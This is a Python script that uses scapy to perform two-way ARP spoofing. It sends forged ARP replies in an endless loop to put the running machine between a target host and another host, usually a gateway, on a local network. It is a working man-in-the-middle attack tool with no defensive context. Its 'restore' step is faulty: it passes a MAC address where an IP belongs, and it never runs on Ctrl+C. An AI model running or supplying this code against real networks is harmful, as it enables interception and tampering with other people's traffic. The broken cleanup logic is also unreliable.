from scapy.layers.l2 import getmacbyip
from scapy.layers.l2 import ARP
from scapy.all import send

import time


def arpspoof(target_ip: str, spoof_ip: str):
    """
    spoofs the arp of the specified `spoof_ip` by sending our
    mac address to the `target_ip` in an ARP packet.
    """
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print("[-] Cannot perform spoofing as mac cannot be extracted")
        return False

    # op = 2 means that we are aggressively broadcasting that this is the mac
    # address of the arp... which by default is our mac address, since we did not specify any.
    arp_packet = ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=spoof_ip)
    send(arp_packet)
    return True


def restore_spoof(target_ip: str, gateway_ip: str):
    """
    restores the original connection of the `target_ip` to the `gateway_ip`
    to avoid unintended DoS attack.
    """
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[-] Cannot perform restoration as one of the ips are unreachable!")
        return False

    arp_packet = ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=gateway_mac, hsrc=gateway_mac)
    send(arp_packet, count=5)
    return True


def complete_spoof(target_ip: str, spoof_ip: str, timeout: int = 2):
    print("[*] Performing duplex spoofing... press ctrl + c to cancel")
    while True:
        try:
            arpspoof(target_ip, spoof_ip)
            arpspoof(spoof_ip, target_ip)
            time.sleep(timeout)
        except Exception as e:
            print("[*] Restoring ARP to original...")
            restore_spoof(target_ip, spoof_ip)
            restore_spoof(spoof_ip, target_ip)
            print("[*] ARP restored")
